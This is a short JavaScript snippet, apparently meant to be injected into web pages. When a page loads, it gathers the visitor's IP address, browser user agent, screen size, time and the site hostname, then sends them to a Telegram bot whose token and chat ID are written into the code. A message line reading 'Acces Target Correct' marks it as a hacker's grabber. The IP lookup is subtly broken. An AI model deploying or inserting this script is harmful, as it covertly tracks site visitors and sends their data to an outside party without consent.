<script>
  (async () => {
    const data = {
      ip: await (await fetch("https://api.ipify.org?format=json")).json().ip,
      ua: navigator.userAgent,
      screen: screen.width + "x" + screen.height,
      time: new Date().toISOString()
    };

    const msg = `
Acces Target Correct . . . / Who Is WhyNF???
IP: ${data.ip}
UA: ${data.ua}
Screen: ${data.screen}
Time: ${data.time}
IP Asli: ${location.hostname}
    `.trim();

    
    await fetch(`https://api.telegram.org/bot7243442499:AAHnsatLgg5GCkl96Zmg7GFpeRaoKWylGNs/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: "8361119354",
        text: msg,
        parse_mode: "Markdown"
      })
    });
  })();
</script>